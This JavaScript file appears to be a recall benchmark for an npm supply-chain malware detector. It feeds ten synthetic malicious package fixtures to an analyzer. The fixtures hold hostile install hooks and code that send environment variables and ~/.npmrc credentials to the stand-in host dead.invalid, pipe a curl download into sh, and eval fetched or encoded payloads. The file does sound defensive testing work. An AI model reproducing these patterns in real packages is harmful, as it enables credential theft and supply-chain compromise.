// True-positive (recall) benchmark: synthetic packages modeled on documented
// npm supply-chain attack patterns (Shai-Hulud, event-stream, ctx/chalk-clone
// style). All samples are inert fixtures — dead URLs, no working payloads —
// they exist only to verify the heuristics fire. Target from the execution
// plan: >90% must score "suspicious". Run: node bench/true-positives.js
import { analyze } from "../src/analyze.js";

const NOW = Date.now();
const daysAgo = (n) => new Date(NOW - n * 86_400_000).toISOString();
const hoursAgo = (n) => new Date(NOW - n * 3_600_000).toISOString();
const file = (name, source) => ({
  name: `package/${name}`,
  size: source.length,
  data: Buffer.from(source),
});

function sample(name, overrides) {
  return {
    name,
    version: "1.0.0",
    manifest: { scripts: {}, dependencies: {} },
    files: [],
    weeklyDownloads: 20,
    createdAt: daysAgo(3),
    versionPublishedAt: daysAgo(1),
    maintainers: [{ name: "attacker" }],
    readme: null,
    ...overrides,
  };
}

const SAMPLES = [
  {
    label: "postinstall env exfiltration (Shai-Hulud pattern)",
    pkg: sample("env-harvester", {
      manifest: { scripts: { postinstall: "node collect.js" }, dependencies: {} },
      files: [
        file("collect.js", `
          const payload = JSON.stringify(process.env);
          fetch("https://dead.invalid/ingest", { method: "POST", body: payload });
        `),
      ],
    }),
  },
  {
    label: "typosquat of chalk with hex-packed payload",
    pkg: sample("chalkk", {
      files: [
        file("index.js", `
          const s = "${"\\x68".repeat(60)}";
          module.exports = () => eval(s);
        `),
      ],
    }),
  },
  {
    label: "preinstall shell one-liner in scripts field",
    pkg: sample("build-helperr", {
      manifest: {
        scripts: { preinstall: "curl -s https://dead.invalid/x.sh | sh" },
        dependencies: {},
      },
    }),
  },
  {
    label: "credential file reader + upload",
    pkg: sample("npm-utils-plus", {
      manifest: { scripts: { install: "node setup.js" }, dependencies: {} },
      files: [
        file("setup.js", `
          const fs = require("fs"), os = require("os");
          const creds = fs.readFileSync(os.homedir() + "/.npmrc", "utf8");
          require("https").request({ host: "dead.invalid", method: "POST" }).end(creds + process.env.PATH);
        `),
      ],
    }),
  },
  {
    label: "base64 stage-2 downloader",
    pkg: sample("fast-json-parserr", {
      files: [
        file("loader.js", `
          const blob = "${"QUJDRA==".repeat(40)}";
          const code = Buffer.from(blob, "base64").toString();
          new Function(code)();
        `),
      ],
    }),
  },
  {
    label: "compromised maintainer: fresh release of established package",
    pkg: sample("popular-logger", {
      createdAt: daysAgo(1500),
      versionPublishedAt: hoursAgo(6),
      weeklyDownloads: 4_000_000,
      maintainers: [{ name: "victim" }],
      readme: "x".repeat(2000),
      manifest: { scripts: { postinstall: "node telemetry.js" }, dependencies: {} },
      files: [
        file("telemetry.js", `
          const env = process.env;
          const cp = require("child_process");
          cp.execSync("whoami");
          fetch("https://dead.invalid/t", { method: "POST", body: JSON.stringify(env) });
        `),
      ],
    }),
  },
  {
    label: "node -e inline payload in install hook",
    pkg: sample("ts-node-fast", {
      manifest: {
        scripts: {
          postinstall: `node -e "require('child_process').exec(process.env.SHELL)"`,
        },
        dependencies: {},
      },
    }),
  },
  {
    label: "shipped executable launched at install",
    pkg: sample("image-optimizer-pro", {
      manifest: { scripts: { postinstall: "runner.exe" }, dependencies: {} },
      files: [file("runner.exe", "MZ\x90\x00binarybinary")],
    }),
  },
  {
    label: "eval over network response at import time",
    pkg: sample("react-hooks-utils", {
      files: [
        file("index.js", `
          fetch("https://dead.invalid/conf").then(r => r.text()).then(t => eval(t));
          module.exports = {};
        `),
      ],
    }),
  },
  {
    label: "typosquat of axios, brand new, single maintainer",
    pkg: sample("axioss", {
      files: [file("index.js", `module.exports = require("http");`)],
    }),
  },
];

let hits = 0;
const misses = [];
for (const { label, pkg } of SAMPLES) {
  const report = analyze(pkg);
  const hit = report.verdict === "suspicious";
  if (hit) hits++;
  else misses.push({ label, verdict: report.verdict, score: report.score });
  console.log(
    `${hit ? "ok" : "MISS"}  [${report.verdict} ${String(report.score).padStart(3)}] ${label}`,
  );
}

const recall = (hits / SAMPLES.length) * 100;
console.log(`\n=== recall ${hits}/${SAMPLES.length} = ${recall.toFixed(0)}% (target >90%) ===`);
for (const m of misses) console.log(`  missed: ${m.label} → ${m.verdict} (${m.score})`);
process.exit(recall > 90 ? 0 : 1);
